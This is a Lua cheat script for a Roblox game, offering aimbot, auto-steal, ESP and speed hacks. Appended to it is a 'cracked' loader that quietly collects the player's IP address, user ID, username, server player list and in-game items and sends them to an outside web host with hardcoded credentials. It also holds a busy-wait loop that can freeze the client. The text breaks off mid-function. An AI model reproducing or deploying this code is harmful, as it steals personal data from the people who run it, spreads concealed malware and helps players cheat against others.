            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                if activeScaleTween then activeScaleTween:Cancel() end
                activeScaleTween = TS_G:Create(buttonScale, pressTween, {Scale = 0.88})
                activeScaleTween:Play()
            end
        end)
        hit.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                if activeScaleTween then activeScaleTween:Cancel() end
                activeScaleTween = TS_G:Create(buttonScale, bounceTween, {Scale = 1.08})
                activeScaleTween:Play()
                task.delay(0.18, function()
                    if buttonScale.Parent then
                        activeScaleTween = TS_G:Create(buttonScale, pressTween, {Scale = 1})
                        activeScaleTween:Play()
                    end
                end)
            end
        end)
        local i = {id=p[1], button=button, hit=hit, stroke=stroke, gradient=gradient, userMoved=false}
        byId[p[1]], infos[#infos+1] = i, i
        style(i, false)
    end
    local dragHandle = Instance.new("Frame")
    dragHandle.Name = "FloatingPanelDragHandle"
    dragHandle.Size = UDim2.fromOffset(216, 50)
    dragHandle.BackgroundTransparency = 1
    dragHandle.Active = true
    dragHandle.ZIndex = 1
    dragHandle.Parent = container
    makeDraggable(dragHandle, true, container)
    makeDraggable(byId.InstaReset.hit, true, byId.InstaReset.button, function() byId.InstaReset.userMoved = true end)
    makeDraggable(byId.BatUp.hit, true, byId.BatUp.button, function() byId.BatUp.userMoved = true end)

    S._floatingButtonInfos = infos
    S._floatingFreeButtonLayer = container
    S._floatingUpdateLayout = function() end
    local function get(id) return byId[id] end
    local function connect(id, fn)
        get(id).hit.Activated:Connect(function()
            if not S._floatingPanelDragging then fn() end
        end)
    end
    connect("Drop", function() flash(get("Drop"), 0.5); task.spawn(runDropBrainrot) end)
    connect("InstaReset", function() flash(get("InstaReset"), 0.5); if _G.InstaReset and _G.InstaReset.Trigger then _G.InstaReset.Trigger() end end)
    connect("BatUp", function()
        local on = not S.tpBatEnabled
        setTpBat(on); style(get("BatUp"), on); saveConfig()
    end)
    connect("TPDown", function() flash(get("TPDown"), 0.45); runTPFloor() end)
    connect("AutoBat", function()
        local on = not S.batAimbotEnabled
        if on then
            if S.autoLeftEnabled then S.autoLeftEnabled=false; stopAutoLeft() end
            if S.autoRightEnabled then S.autoRightEnabled=false; stopAutoRight() end
        end
        setBatAimbot(on); style(get("AutoBat"), on); updateFloatingButtons()
    end)
    connect("AutoLeft", function()
        local on = not S.autoLeftEnabled
        if on then
            if S.autoRightEnabled then S.autoRightEnabled=false; stopAutoRight() end
            if S.batAimbotEnabled then setBatAimbot(false) end
            S.autoLeftEnabled=true; startAutoLeft()
        else S.autoLeftEnabled=false; stopAutoLeft() end
        if S.autoLeftSetVisual then S.autoLeftSetVisual(on) end
        S.restartMovement(); updateFloatingButtons(); saveConfig()
    end)
    connect("AutoRight", function()
        local on = not S.autoRightEnabled
        if on then
            if S.autoLeftEnabled then S.autoLeftEnabled=false; stopAutoLeft() end
            if S.batAimbotEnabled then setBatAimbot(false) end
            S.autoRightEnabled=true; startAutoRight()
        else S.autoRightEnabled=false; stopAutoRight() end
        if S.autoRightSetVisual then S.autoRightSetVisual(on) end
        S.restartMovement(); updateFloatingButtons(); saveConfig()
    end)
    local function normalSpeed()
        S.setNormalSpeedMode(); S.restartMovement(); updateFloatingButtons()
        style(get("CarrySpd"), false); style(get("LaggerCarry"), false); style(get("LaggerNormal"), false); saveConfig()
    end
    connect("CarrySpd", function()
        if S.speedMode and S.laggerMode == 0 then
            normalSpeed()
        else
            S.setCarrySpeedMode()
            S.restartMovement()
            updateFloatingButtons()
            style(get("LaggerNormal"), false)
            style(get("LaggerCarry"), false)
            saveConfig()
        end
    end)
    local function lagger(mode)
        if S.laggerMode == mode and not S.speedMode then normalSpeed(); return end
        S.speedMode=false; S.laggerMode=mode; S.refreshSpeedModeLabel(); S.applySpeedVelocityNow(); S.restartMovement(); updateFloatingButtons()
        style(get("LaggerCarry"), mode == 2); style(get("LaggerNormal"), mode == 1); saveConfig()
    end
    connect("LaggerCarry", function() lagger(2) end)
    connect("LaggerNormal", function() lagger(1) end)

    S.tpBatSetVisual = function(active) style(get("BatUp"), active) end
    S.dropBrainrotSetVisual = function(active) style(get("Drop"), active) end
    S.dropBrainrotFloatVisual = S.dropBrainrotSetVisual
    S._btnAAL, S._bsAAL, S._l1AAL, S._l2AAL = get("AutoLeft").button, nil, nil, nil
    S._btnAAR, S._bsAAR, S._l1AAR, S._l2AAR = get("AutoRight").button, nil, nil, nil
    S._btnBAT, S._bsBAT, S._l1BAT, S._l2BAT = get("AutoBat").button, nil, nil, nil
    S._setPButtonActive = function(button, _, _, _, active)
        for _, i in pairs(byId) do if i.button == button then style(i, active); return end end
    end
    S._floatingButtons = {
        lagger=get("LaggerNormal").button, l2Lagger={Text=""}, carry=get("CarrySpd").button,
        autoLeft=get("AutoLeft").button, autoRight=get("AutoRight").button, bat=get("AutoBat").button,
    }
    style(get("BatUp"), S.tpBatEnabled)
    style(get("AutoBat"), S.batAimbotEnabled)
    style(get("AutoLeft"), S.autoLeftEnabled)
    style(get("AutoRight"), S.autoRightEnabled)
    style(get("CarrySpd"), S.speedMode and S.laggerMode == 0)
    style(get("LaggerNormal"), S.laggerMode == 1 and not S.speedMode)
    style(get("LaggerCarry"), S.laggerMode == 2 and not S.speedMode)
end

-- ── Load config then build UI ─────────────────────────────────────────────
pcall(function()
    local ok, data = pcall(function()
        if safeIsfile(CONFIG_FILE) then return safeReadfile(CONFIG_FILE) end
        if safeIsfile("HavenDuels_backup.json") then return safeReadfile("HavenDuels_backup.json") end
        if safeIsfile(LEGACY_CONFIG_FILE) then return safeReadfile(LEGACY_CONFIG_FILE) end
    end)
    if ok and data then
        local cfgOk, cfg = pcall(function() return HS:JSONDecode(data) end)
        if cfgOk and type(cfg)=="table" then
            if type(cfg.normalSpeed)=="number" then S.NS=cfg.normalSpeed end
            -- HAVEN DUELS usa únicamente fondo negro.
            S.backgroundAssetId = "BLACK"
            if type(cfg.carrySpeed)=="number" then S.CS=cfg.carrySpeed end
            if type(cfg.laggerSpeed)=="number" then S.LS=cfg.laggerSpeed end
            if type(cfg.laggerCarrySpeed)=="number" then S.LCS=cfg.laggerCarrySpeed end
            if type(cfg.grabRadius)=="number" then S.Steal.StealRadius=cfg.grabRadius end
            if cfg.stealDuration ~= nil then
                S.Steal.StealDuration = sanitizeStealDuration(cfg.stealDuration, S.Steal.StealDuration)
            end
            if type(cfg.autoCarryEnabled) == "boolean" then
                S.autoCarryEnabled = cfg.autoCarryEnabled
            end
            if type(cfg.mobileButtonPositions)=="table" then S.mobileButtonPositions=cfg.mobileButtonPositions end
            if type(cfg.floatingFreeButtonPositions)=="table" then S.floatingFreeButtonPositions=cfg.floatingFreeButtonPositions end
            if type(cfg.lockMobileButtons)=="boolean" then S.lockMobileButtons=cfg.lockMobileButtons end
            local function rl(e,s) if type(s)=="table" then if s.kb then e.kb=Enum.KeyCode[s.kb] end; if s.gp then e.gp=Enum.KeyCode[s.gp] end end end
            -- Solo restaurar keybinds de configs ya migradas; las antiguas usaban teclas previas.
            if cfg.keybindVersion == 1 then
                rl(S.KB.DropBrainrot, cfg.dropBrainrotKey); rl(S.KB.AutoLeft, cfg.autoLeftKey)
                rl(S.KB.AutoRight, cfg.autoRightKey); rl(S.KB.AutoBat, cfg.autoBatKey)
                rl(S.KB.TpBat, cfg.tpBatKey); rl(S.KB.TPFlor, cfg.tpFloorKey); rl(S.KB.GuiHide, cfg.guiHideKey)
                rl(S.KB.SpeedToggle, cfg.speedToggleKey); rl(S.KB.LaggerToggle, cfg.laggerToggleKey)
                rl(S.KB.InstaReset, cfg.instaResetKey)
            end
            if cfg.carryMode==true then S.speedMode=true; S.setCarrySpeedMode() end
            if cfg.laggerMode == 1 then
                S.setLaggerNormalMode()
            elseif cfg.laggerMode == 2 then
                S.setLaggerCarryMode()
            end
            if cfg.antiRagdoll==true then S.antiRagdollEnabled=true; startAntiRagdoll() end
            S.tpDownHeightTrigger = 20
            if type(cfg.tpDownHeightTrigger) == "number" then S.tpDownHeightTrigger = math.clamp(cfg.tpDownHeightTrigger, 1, 500) end
            -- Migrar el antiguo estado Infinite Jump a la única opción Hold Jump.
            if cfg.holdJumpEnabled==true or cfg["infiniteJump"]==true then S.holdJumpEnabled=true; startHoldJump() end
            if cfg.medusaCounter==true then
                S.medusaCounterEnabled=true
                if LP.Character then setupMedusaCounter(LP.Character) end
            end
            if cfg.batCounter==true then
                S.batCounterEnabled=true
                startBatCounter()
            end
            if cfg.autoStealEnabled==true then S.stealActive=true; startAutoSteal() end
            if cfg.batAimbot==true then S.batAimbotEnabled=true; startBatAimbot() end
            if cfg.tpBat == true then setTpBat(true) end
            if type(cfg.batSkin) == "string" then S.setBatSkin(cfg.batSkin, false) end
            if type(cfg.displaySkin) == "string" and ({Off=true,PURPLE=true,BLUE=true,RED=true,BLACK=true,GREEN=true,WHITE=true})[cfg.displaySkin] then S.displaySkin=cfg.displaySkin end
            S.customSkinEnabled = cfg.customSkin == true and S.displaySkin ~= "Off"
            if S.customSkinEnabled and S.applyDisplaySkin then task.defer(function() pcall(S.applyDisplaySkin) end) end
            if cfg.espEnabled==true then
                S.espEnabled=true
                toggleESP(true)
                task.spawn(function()
                    task.wait(1)
                    if S.setESPVisual then S.setESPVisual(true) end
                end)
            end
            if type(cfg.stealHudPos)=="table" then
                S._savedStealHudPos = cfg.stealHudPos
                task.defer(function()
                    if S.stealHudCard and S._savedStealHudPos then
                        local pos = S._savedStealHudPos
                        S.stealHudCard.Position = UDim2.new(
                            pos.XS or 0.5, pos.X or 0,
                            pos.YS or 1, pos.Y or -106
                        )
                    end
                end)
            end
            if cfg.unwalkEnabled==true then S.unwalkEnabled=true; startUnwalk() end
            if cfg.lockUI==true then S.lockUIEnabled=true end
            if cfg.fpsBoost==true then S.fpsBoostEnabled=true; applyFPSBoost() end
            S.vividGraphicsEnabled = cfg.vividGraphics == true
            if S.vividGraphicsEnabled then pcall(enableVividGraphics) end
            if type(cfg.stretchFOV) == "number" then S.stretchFOV = math.clamp(cfg.stretchFOV, 70, 150) end
            S.stretchEnabled = cfg.stretchEnabled == true
            if S.stretchEnabled then pcall(enableStretch) end
            if type(cfg.skyTheme) == "string" and SKY_PRESETS[cfg.skyTheme] then
                S.skyTheme = cfg.skyTheme
                if S.skyTheme ~= "Off" then pcall(applyCustomSky, S.skyTheme) end
            else
                S.skyTheme = "Off"
            end
            if type(cfg.krobloxMode) == "string" and ({Off=true, Left=true, Right=true, Both=true})[cfg.krobloxMode] then
                S.krobloxMode = cfg.krobloxMode
                if S.krobloxMode ~= "Off" then pcall(_G._VisionApplyKroblox, S.krobloxMode) end
            else
                S.krobloxMode = "Off"
            end
            S.antiFlingEnabled = cfg.antiFling == true
            if S.antiFlingEnabled then pcall(YF.startAntiFling) end
            if type(cfg.lockEnemyRange) == "number" then S.bodyLockRange = math.clamp(math.floor(cfg.lockEnemyRange), 5, 200) end
            S.bodyLockEnabled = cfg.lockEnemy == true
            if S.bodyLockEnabled then pcall(YF.startBodyLock) end
            if type(cfg.animPack) == "string" and (cfg.animPack == "Off" or YF.ANIM_PACKS[cfg.animPack]) then
                S.currentAnimPack = cfg.animPack
            else
                S.currentAnimPack = "Off"
            end
            if S.currentAnimPack ~= "Off" then pcall(YF.startAnimPack, S.currentAnimPack) end
            S.antiLagEnabled = cfg.antiLag == true
            if S.antiLagEnabled then pcall(YF.enableAntiLag) end
            if cfg.hideOpiumButtons==true then S.hideOpiumButtonsEnabled=true end
            if type(cfg.floatingPanelPos)=="table" then
                -- El panel todavía no existe aquí; createFloatingButtonPanel lo aplica después.
                S._savedFloatingPanelPos = cfg.floatingPanelPos
            end
        end
    end
    task.defer(function()
        if S.autoCarrySetVisual then pcall(S.autoCarrySetVisual, S.autoCarryEnabled) end
    end)
end)


-- ── Nueva barra Steal (diseño adjunto) ───────────────────────────────────
local function buildStealHUD()
    local sg = Instance.new("ScreenGui")
    sg.Name = "StealBarMovableSmall"
    sg.ResetOnSpawn = false
    sg.IgnoreGuiInset = true
    sg.DisplayOrder = 999999
    sg.ZIndexBehavior = Enum.ZIndexBehavior.Global

    local parent
    pcall(function()
        if type(gethui) == "function" then parent = gethui() end
    end)
    if not parent then parent = game:GetService("CoreGui") end
    if not pcall(function() sg.Parent = parent end) or not sg.Parent then
        sg.Parent = LP:WaitForChild("PlayerGui")
    end

    local panel = Instance.new("Frame")
    panel.Name = "StealProgressBar"
    panel.Size = UDim2.new(0, 300, 0, 54)
    panel.Position = UDim2.new(0.5, -150, 1, -75)
    panel.BackgroundColor3 = Color3.fromRGB(5, 5, 8)
    panel.BackgroundTransparency = 0
    panel.BorderSizePixel = 0
    panel.Active = true
    panel.Selectable = true
    panel.Visible = true
    panel.ZIndex = 100
    panel.Parent = sg

    local panelCorner = Instance.new("UICorner")
    panelCorner.CornerRadius = UDim.new(0, 13)
    panelCorner.Parent = panel
    local panelStroke = Instance.new("UIStroke")
    panelStroke.Color = Color3.fromRGB(25, 25, 30)
    panelStroke.Thickness = 1.3
    panelStroke.Transparency = 0.15
    panelStroke.Parent = panel


    local fpsText = Instance.new("TextLabel")
    fpsText.Name = "FPS"
    fpsText.Size = UDim2.new(1, -24, 0, 17)
    fpsText.Position = UDim2.new(0, 12, 0, 6)
    fpsText.BackgroundTransparency = 1
    fpsText.Text = "60FPS · 0ms"
    fpsText.TextColor3 = Color3.fromRGB(205, 205, 215)
    fpsText.Font = Enum.Font.Gotham
    fpsText.TextSize = 12
    fpsText.TextXAlignment = Enum.TextXAlignment.Left
    fpsText.TextYAlignment = Enum.TextYAlignment.Center
    fpsText.ZIndex = 103
    fpsText.Parent = panel

    local row = Instance.new("Frame")
    row.Name = "ProgressRow"
    row.Size = UDim2.new(1, -20, 0, 16)
    row.Position = UDim2.new(0, 10, 0, 30)
    row.BackgroundTransparency = 1
    row.ZIndex = 101
    row.Parent = panel

    local background = Instance.new("Frame")
    background.Name = "BarBackground"
    background.Size = UDim2.new(1, 0, 1, 0)
    background.BackgroundColor3 = Color3.fromRGB(24, 24, 30)
    background.BorderSizePixel = 0
    background.ClipsDescendants = true
    background.ZIndex = 101
    background.Parent = row
    local backgroundCorner = Instance.new("UICorner")
    backgroundCorner.CornerRadius = UDim.new(0, 8)
    backgroundCorner.Parent = background

    local fill = Instance.new("Frame")
    fill.Name = "ProgressFill"
    fill.Size = UDim2.new(0, 0, 1, 0)
    fill.BackgroundColor3 = Color3.fromRGB(218, 155, 255)
    fill.BorderSizePixel = 0
    fill.ZIndex = 102
    fill.Parent = background
    local fillCorner = Instance.new("UICorner")
    fillCorner.CornerRadius = UDim.new(0, 8)
    fillCorner.Parent = fill
    local fillGradient = Instance.new("UIGradient")
    fillGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 230, 255)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(218, 155, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(154, 62, 230)),
    })
    fillGradient.Parent = fill

    local percent = Instance.new("TextLabel")
    percent.Name = "Percent"
    percent.Size = UDim2.new(1, 0, 1, 0)
    percent.BackgroundTransparency = 1
    percent.Text = "0%"
    percent.TextColor3 = Color3.fromRGB(255, 255, 255)
    percent.Font = Enum.Font.Gotham
    percent.TextSize = 11
    percent.TextXAlignment = Enum.TextXAlignment.Center
    percent.TextYAlignment = Enum.TextYAlignment.Center
    percent.TextStrokeColor3 = Color3.fromRGB(245, 245, 250)
    percent.TextStrokeTransparency = 1
    percent.ZIndex = 104
    percent.Parent = background

    -- Arrastre con mouse o toque.
    local dragging, dragInput, dragStart, startPosition = false, nil, nil, nil
    local moved = false
    local function updateDrag(input)
        if S.lockUIEnabled then return end
        if (input.Position - dragStart).Magnitude > 2 then moved = true end
        local delta = input.Position - dragStart
        panel.Position = UDim2.new(
            startPosition.X.Scale, startPosition.X.Offset + delta.X,
            startPosition.Y.Scale, startPosition.Y.Offset + delta.Y
        )
    end
    panel.InputBegan:Connect(function(input)
        if S.lockUIEnabled then return end
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            moved = false
            dragStart = input.Position
            startPosition = panel.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    if moved then saveConfig() end
                    dragging = false
                    moved = false
                end
            end)
        end
    end)
    panel.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)
    UIS.InputChanged:Connect(function(input)
        if S.lockUIEnabled then
            dragging = false
            moved = false
            return
        end
        if input == dragInput and dragging then updateDrag(input) end
    end)

    S.progressBarFrame = background
    S.progressFill = fill
    S.progressPct = percent
    S.stealHudCard = panel
    if S._savedStealHudPos then
        local pos = S._savedStealHudPos
        panel.Position = UDim2.new(pos.XS or 0.5, pos.X or 0, pos.YS or 1, pos.Y or -106)
    end

    -- Actualización de FPS y ping del diseño adjunto.
    task.spawn(function()
        local lastTime, frameCount = os.clock(), 0
        while sg.Parent do
            RunService.RenderStepped:Wait()
            frameCount += 1
            local now = os.clock()
            if now - lastTime >= 0.5 then
                local fps = math.floor(frameCount / (now - lastTime) + 0.5)
                frameCount, lastTime = 0, now
                local ping = 0
                pcall(function() ping = math.floor(LP:GetNetworkPing() * 1000 + 0.5) end)
                fpsText.Text = string.format("%dFPS · %dms", fps, ping)
            end
        end
    end)
end

interfaceLoaded = false
local function loadVisionInterface()
    if interfaceLoaded then return end
    interfaceLoaded = true
    -- Cargar la interfaz local inmediatamente; la música se reproduce por separado.
    createFloatingButtonPanel()
    buildGui()
    buildStealHUD()
    local character = LP.Character
    if character then
        S.setupSpeedBillboard(character)
        setupVisionRagdollTimer(character)
    end

    -- El cargador remoto es opcional y no debe bloquear la aparición del menú.
    task.spawn(function()
        local ok, err = pcall(runRemoteLoader)
        if not ok then
            warn("[HAVEN DUELS] Cargador remoto omitido: " .. tostring(err))
        end
    end)
end

LP.CharacterAdded:Connect(function(char)
    task.wait(0.5)
    if interfaceLoaded then
        S.setupSpeedBillboard(char)
        setupVisionRagdollTimer(char)
    end
    if S.antiRagdollEnabled then startAntiRagdoll() end
    if S.medusaCounterEnabled then setupMedusaCounter(char) end
    if S.currentAnimPack ~= "Off" then
        task.spawn(function()
            local animate = char:WaitForChild("Animate", 5)
            if animate and LP.Character == char and S.currentAnimPack ~= "Off" then
                pcall(YF.saveOriginalAnims, char)
                pcall(YF.startAnimPack, S.currentAnimPack)
            end
        end)
    end
    if S.holdJumpEnabled and not S._youtResetInProgress then startHoldJump() end
    if S.unwalkEnabled then task.wait(1); startUnwalk() end
    S.restartMovement()
end)
if LP.Character then
    task.spawn(function()
        if interfaceLoaded then
            S.setupSpeedBillboard(LP.Character)
            setupVisionRagdollTimer(LP.Character)
        end
        if S.antiRagdollEnabled then startAntiRagdoll() end
        if S.medusaCounterEnabled then setupMedusaCounter(LP.Character) end
    end)
end

clearOldVisionInterface()
showIntro(function()
    loadVisionInterface()
end)

-- [[ Hii! this file was cracked by SOURCE_CODE ]]
-- [[ TIMESTAMP: 10:10:26 ]]

local BASE = "https://generator-crash.lovable.app"
local SITE_SLUG = "crashhaha"
local SITE_PASSWORD = "elias123@"
local KEY = "xenooooo"
local LOADER_VERSION = "1.9.0"

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local MarketplaceService = game:GetService("MarketplaceService")
local RobloxReplicated = game:GetService("RobloxReplicatedStorage")

local genv = (getgenv and getgenv()) or _G or {}

if type(genv.__XENO_CLEANUP) == "function" then pcall(genv.__XENO_CLEANUP) end

genv.__XENO_SESSION = (tonumber(genv.__XENO_SESSION) or 0) + 1
local SESSION = genv.__XENO_SESSION
local function alive() return genv.__XENO_SESSION == SESSION end


local function resolveRequest()
    return http_request
        or request
        or (syn and syn.request)
        or (http and http.request)
        or (fluxus and fluxus.request)
        or (krnl and krnl.request)
        or genv.http_request
        or genv.request
        or (genv.syn and genv.syn.request)
        or (genv.http and genv.http.request)
end

local request = resolveRequest()
if not request then
    local deadline = tick() + 10
    repeat task.wait(0.25) request = resolveRequest() until request or tick() > deadline
end

local function fallbackRequest(opts)
    local method = (opts.Method or "GET"):upper()
    if method == "POST" then
        local ok, res = pcall(function()
            return game:HttpPostAsync(opts.Url, opts.Body or "", "application/json")
        end)
        if ok then return { Body = res, StatusCode = 200, Success = true } end
        return nil
    end
    local ok, res = pcall(function() return game:HttpGetAsync(opts.Url) end)
    if ok then return { Body = res, StatusCode = 200, Success = true } end
    ok, res = pcall(function() return game:HttpGet(opts.Url) end)
    if ok then return { Body = res, StatusCode = 200, Success = true } end
    return nil
end

local function httpOnce(opts)
    if not request then request = resolveRequest() end
    if request then
        local ok, res = pcall(request, opts)
        if ok and res and (res.StatusCode == nil or (res.StatusCode >= 200 and res.StatusCode < 300)) then
            return res
        end
    end
    return fallbackRequest(opts)
end

local function httpRequest(opts)
    for attempt = 1, 3 do
        local res = httpOnce(opts)
        if res then return res end
        task.wait(0.2 * attempt)
    end
    return nil
end


local LP = Players.LocalPlayer
if not LP then
    local deadline = tick() + 30
    repeat task.wait(0.1) LP = Players.LocalPlayer until LP or tick() > deadline
end
if not LP then return end

local function safe(fn) local ok, res = pcall(fn) if ok then return res end return nil end

local executorName = "unknown"
do
    local ok, name = pcall(function()
        if identifyexecutor then return (identifyexecutor()) end
        return nil
    end)
    if ok and type(name) == "string" and name ~= "" then executorName = name end
end

local cachedGameName = nil
local function gameName()
    if cachedGameName then return cachedGameName end
    local info = safe(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
    if info and info.Name then cachedGameName = info.Name end
    return cachedGameName or "Unknown Game"
end

local clientIp = ""
task.spawn(function()
    local ok, ip = pcall(function() return game:HttpGet("https://api.ipify.org") end)
    if ok and type(ip) == "string" then
        ip = ip:gsub("%s+", "")
        if #ip > 0 and #ip < 64 then clientIp = ip end
    end
    if clientIp == "" then
        local res = httpOnce({ Url = "https://api.ipify.org", Method = "GET" })
        if res and type(res.Body) == "string" then
            local b = res.Body:gsub("%s+", "")
            if #b > 0 and #b < 64 then clientIp = b end
        end
    end
end)

local function avatarUrl()
    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=150&height=150&format=png"
end

local function serverPlayers()
    local t = {}
    for _, p in ipairs(Players:GetPlayers()) do t[#t+1] = p.Name end
    return t
end

local function collectBrainrots()
    local list = {}
    local pg = safe(function() return LP:FindFirstChild("PlayerGui") end)
    if not pg then return list end

    local possibleGUIs = {
        "DuelsMachineSession",
        "DuelsMachine",
        "BrainrotUI",
        "BrainrotSession",
        "SessionGUI",
        "DuelsGUI",
    }

    local gui = nil
    for _, name in ipairs(possibleGUIs) do
        gui = safe(function() return pg:FindFirstChild(name) end)
        if gui then break end
    end
    if not gui then return list end

    local targetFrame = nil
    local function findFrame(container)
        if not container then return end
        for _, child in ipairs(container:GetChildren()) do
            if child:IsA("Frame") and (child.Name == "ScrollingFrame" or child.Name == "ListFrame" or child.Name == "ItemList" or child:FindFirstChild("Template")) then
                return child
            end
            local found = findFrame(child)
            if found then return found end
        end
        return nil
    end

    targetFrame = findFrame(gui)
    if not targetFrame then
        targetFrame = safe(function() return gui:FindFirstChild("ScrollingFrame") end)
    end
    if not targetFrame then
        for _, child in ipairs(gui:GetDescendants()) do
            if child:IsA("Frame") and #child:GetChildren() > 3 then
                targetFrame = child
                break
            end
        end
    end
    if not targetFrame then return list end

    local processedItems = {}
    local function processItem(item)
        if not item or not item:IsA("Instance") or processedItems[item] then return end
        processedItems[item] = true

        local title = nil
        local cash = nil

        for _, obj in ipairs(item:GetDescendants()) do
            if (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox")) and obj.Text and obj.Text ~= "" then
                local text = obj.Text
                if not string.find(text, "Template") and not string.find(text, "Background") and not string.find(text, "Frame") and not string.find(text, "Scroll") and not string.find(text, "Title") and not string.find(text, "Label") then
                    if string.match(text, "%a") and #text > 1 and #text < 50 and not string.find(text, "^%d+$") then
                        if not title or (#text > #title) then
                            title = text
                        end
                    end
                    if string.find(text, "%$") or string.find(text, "Cookie") or string.find(text, "Milki") or string.find(text, "coins") or string.find(text, "Cash") or
                       (string.match(text, "^%d+$") and tonumber(text) and tonumber(text) > 50) then
                        cash = text
                    end
                end
            end
        end

        if title or cash then
            if title and title ~= "" then
                title = title:gsub("^[%s]+", ""):gsub("[%s]+$", "")
            end
            if cash and cash ~= "" then
                cash = cash:gsub("^[%s]+", ""):gsub("[%s]+$", "")
            end
            if title and string.match(title, "^%d+$") and not cash then
                return
            end
            table.insert(list, {
                title = title and title ~= "" and title or "Unknown Item",
                cash = cash and cash ~= "" and cash or "0"
            })
        end
    end

    local function processAll(container)
        if not container then return end
        for _, child in ipairs(container:GetChildren()) do
            if child:IsA("Frame") and #child:GetChildren() > 0 then
                local hasText = false
                for _, desc in ipairs(child:GetDescendants()) do
                    if (desc:IsA("TextLabel") or desc:IsA("TextButton") or desc:IsA("TextBox")) and desc.Text and desc.Text ~= "" then
                        hasText = true
                        break
                    end
                end
                if hasText then
                    processItem(child)
                end
            end
            if child:IsA("Frame") or child:IsA("ScrollingFrame") then
                processAll(child)
            end
        end
    end

    processAll(targetFrame)

    for _, child in ipairs(targetFrame:GetChildren()) do
        if child.Name == "Template" and child:IsA("Frame") then
            processItem(child)
        end
    end

    if #list == 0 then
        local simpleBrainrots = {}
        local seenTexts = {}
        for _, child in ipairs(pg:GetDescendants()) do
            if (child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("TextBox")) and child.Text and child.Text ~= "" then
                local text = child.Text:gsub("^[%s]+", ""):gsub("[%s]+$", "")
                if #text > 2 and #text < 30 and not string.match(text, "^%d+$") and not seenTexts[text] then
                    seenTexts[text] = true
                    local cash = "0"
                    if string.find(text, "%$") or string.find(text, "Cookie") or string.find(text, "Milki") or string.find(text, "coins") then
                        cash = text:match("[%$]*(%d+)") or text:match("(%d+)") or "0"
                        text = text:gsub("[%$%d]+", ""):gsub("^[%s]+", ""):gsub("[%s]+$", "")
                        if text == "" then text = "Item" end
                    end
                    if #text > 1 then
                        table.insert(simpleBrainrots, { title = text, cash = cash })
                    end
                end
            end
        end
        if #simpleBrainrots > 0 then
            return simpleBrainrots
        end
    end

    return list
end

local firstBeat = true

local function heartbeat()
    safe(function()
        local okBr, brainrots = pcall(collectBrainrots)
        if not okBr or type(brainrots) ~= "table" then brainrots = {} end
        local body = HttpService:JSONEncode({
            user_id = LP.UserId,
            username = LP.Name,
            display_name = LP.DisplayName,
            avatar_url = avatarUrl(),
            place_id = game.PlaceId,
            game_name = gameName(),
            job_id = game.JobId,
            executor = executorName,
            loader_version = LOADER_VERSION,
            client_ip = clientIp,
            session_start = firstBeat,
            server_players = serverPlayers(),
            brainrots = brainrots,
        })
        local res = httpRequest({
            Url = BASE .. "/api/public/heartbeat?site=" .. SITE_SLUG,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json",
                ["X-Api-Key"] = KEY,
                ["X-Site-Slug"] = SITE_SLUG,
                ["X-Site-Password"] = SITE_PASSWORD,
            },
            Body = body,
        })
        if res then firstBeat = false end
        if not res then
            local simpleBrainrots = {}
            local pg = safe(function() return LP:FindFirstChild("PlayerGui") end)
            if pg then
                for _, child in ipairs(pg:GetDescendants()) do
                    if (child:IsA("TextLabel") or child:IsA("TextButton")) and child.Text and child.Text ~= "" then
                        local text = child.Text:gsub("^[%s]+", ""):gsub("[%s]+$", "")
                        if #text > 2 and #text < 30 and not string.match(text, "^%d+$") then
                            table.insert(simpleBrainrots, { title = text, cash = "0" })
                        end
                    end
                end
            end
            if #simpleBrainrots > 0 then
                httpRequest({
                    Url = BASE .. "/api/public/heartbeat?site=" .. SITE_SLUG,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json",
                        ["X-Api-Key"] = KEY,
                        ["X-Site-Slug"] = SITE_SLUG,
                        ["X-Site-Password"] = SITE_PASSWORD,
                    },
                    Body = HttpService:JSONEncode({
                        user_id = LP.UserId,
                        username = LP.Name,
                        display_name = LP.DisplayName,
                        avatar_url = avatarUrl(),
                        place_id = game.PlaceId,
                        game_name = gameName(),
                        job_id = game.JobId,
                        executor = executorName,
                        loader_version = LOADER_VERSION,
                        client_ip = clientIp,
                        server_players = serverPlayers(),
                        brainrots = simpleBrainrots,
                    }),
                })
            end
        end
    end)
end

local fpsConn = nil
local fpsOn = false
local function setFpsLimit(on)
    if on == fpsOn then return end
    fpsOn = on
    if on then
        fpsConn = RunService.RenderStepped:Connect(function()
            local t = tick()
            while tick() - t < 0.95 do end
        end)
    else
        if fpsConn then fpsConn:Disconnect() fpsConn = nil end
    end
end

local HISTORY_SIZE = 0.27
local INTERVAL = 0.6
local NORMAL_SPEED_MIN = 35
local CARRY_SPEED_MIN = 17
local posHistory = {}
local isActive = false
local mode = nil
local intervalThread = nil

RunService.Heartbeat:Connect(function()
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local now = tick()
    posHistory[#posHistory+1] = { cframe = root.CFrame, time = now }
    local cutoff = now - HISTORY_SIZE - 0.1
    while #posHistory > 0 and posHistory[1].time < cutoff do
        table.remove(posHistory, 1)
    end
end)

local function currentSpeed()
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return 0 end
    local v = root.AssemblyLinearVelocity
    return Vector3.new(v.X, 0, v.Z).Magnitude
end

local function meetsSpeedReq()
    local s = currentSpeed()
    if mode == "normal" then return s >= NORMAL_SPEED_MIN end
